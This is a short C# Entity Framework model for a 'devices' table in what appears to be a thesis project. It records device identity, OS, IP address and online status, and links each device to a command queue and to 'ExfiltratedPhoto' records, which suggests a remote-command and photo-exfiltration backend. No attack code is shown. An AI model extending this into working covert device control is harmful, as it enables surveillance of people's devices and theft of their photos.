using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;

namespace tesis.Models
{
    [Table("devices")] // Coincide con tu tabla MySQL
    public class Device
    {
        [Key]
        [Column("device_id")]
        public string DeviceId { get; set; } = string.Empty;

        [Column("model")]
        public string? Model { get; set; }

        [Column("os_version")]
        public string? OsVersion { get; set; }

        [Column("ip_address")]
        public string? IpAddress { get; set; }

        [Column("is_online")]
        public bool IsOnline { get; set; }

        [Column("last_seen")]
        public DateTime LastSeen { get; set; } = DateTime.Now;

        [Column("registered_at")]
        public DateTime RegisteredAt { get; set; } = DateTime.Now;

        // Relaciones (opcional para EF, útil para navegar)
        public List<CommandQueue> Commands { get; set; } = new();
        public List<ExfiltratedPhoto> Photos { get; set; } = new();
    }
}